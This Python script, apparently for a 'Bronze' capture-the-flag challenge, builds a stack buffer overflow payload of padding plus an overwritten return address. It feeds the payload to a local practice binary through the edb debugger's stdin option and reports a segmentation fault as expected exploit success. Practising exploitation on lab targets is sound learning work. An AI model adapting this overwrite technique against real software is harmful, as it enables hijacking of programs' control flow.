# Bronze CTF - Corrected STDIN Injection

import subprocess
import os
import struct
import tempfile

# --- CTF Setup ---
DEBUGGER_NAME = 'edb'
TARGET_EXECUTABLE = './bronze'

# Your specific EIP address
# Note: This payload is still structured for a stack buffer, not a command line arg.
new_eip = struct.pack("<I", 0x08049280)

# The specific string parameter (your payload)
# Total padding = 76 bytes (adjust this padding to match the STDIN buffer size)
PAYLOAD_STRING = b'A' * 64 + b'B' * 16 + new_eip

def run_program_with_stdin_injection():
    temp_file_path = None
    try:
        # 1. Create and write the raw payload to a temporary file
        with tempfile.NamedTemporaryFile(delete=False) as tmp_file:
            temp_file_path = tmp_file.name
            # Write the raw bytes directly to the file
            tmp_file.write(PAYLOAD_STRING)

        print(f"[*] Raw payload written to temporary file: {temp_file_path}")

        # 2. Construct the command to use EDB's --stdin flag
        # EDB requires --stdin <filename> to precede --run
        command = [
            DEBUGGER_NAME,
            '--stdin',                   # Flag 1: Redirect STDIN
            temp_file_path,              # Argument 1: The file to use for STDIN
            '--run',                     # Flag 2: Immediate execution
            TARGET_EXECUTABLE            # Argument 2: The program EDB should run
        ]
        
        # 3. Execute the command
        # Key change: Removing text=True or ensuring it is handled properly, 
        # as edb uses an external terminal.
        result = subprocess.run(
            command,
            capture_output=True,
            # Removed text=True to handle potential encoding issues with terminal output
            check=False
        )

        # 4. Process results (output may be limited since edb opens a terminal)
        print("\n--- Execution Finished ---")
        if result.returncode != 0:
            print(f"Program exited with code {result.returncode}")
            # Common Linux exit code for SIGSEGV is 139
            if result.returncode == 139: 
                print("[+] SEGMENTATION FAULT (Exploit Success Expected)!")
            elif result.returncode == 1:
                print("[-] Error: edb might have failed to launch the terminal (xterm issue).")
        else:
            print("[?] Program exited cleanly (No crash observed).")


    finally:
        # 5. Clean up the temporary file
        if temp_file_path and os.path.exists(temp_file_path):
            os.remove(temp_file_path)
            print(f"[*] Cleaned up temporary file: {temp_file_path}")

if __name__ == "__main__":
    run_program_with_stdin_injection()